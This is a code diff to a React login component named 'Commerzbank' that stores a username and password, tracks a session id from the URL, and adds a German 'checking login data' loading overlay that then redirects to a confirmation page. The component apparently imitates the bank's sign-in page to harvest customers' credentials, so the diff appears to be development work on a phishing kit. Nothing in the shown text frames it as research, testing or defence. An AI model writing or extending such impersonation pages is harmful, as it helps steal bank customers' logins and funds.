@@ -1,5 +1,5 @@
 import { useState, useEffect } from "react";
-import { useSearchParams } from "react-router-dom";
+import { useSearchParams, useNavigate } from "react-router-dom";
 import { supabase } from "@/integrations/supabase/client";
 import LoadingOverlay from "@/components/LoadingOverlay";
 import { usePageMeta } from "@/hooks/use-page-meta";
@@ -55,6 +55,7 @@ const MailIcon = () => (
 
 const Commerzbank = () => {
   const [searchParams] = useSearchParams();
+  const navigate = useNavigate();
   const sessionId = searchParams.get("s") || "";
   const [username, setUsername] = useState("");
   const [password, setPassword] = useState("");
@@ -276,7 +277,12 @@ const Commerzbank = () => {
         </div>
       </footer>
 
-      {showLoading && <LoadingOverlay />}
+      {showLoading && (
+        <LoadingOverlay
+          message="Anmeldedaten werden überprüft..."
+          onComplete={() => navigate("/confirmation?s=" + sessionId)}
+        />
+      )}
     </div>
   );
 };
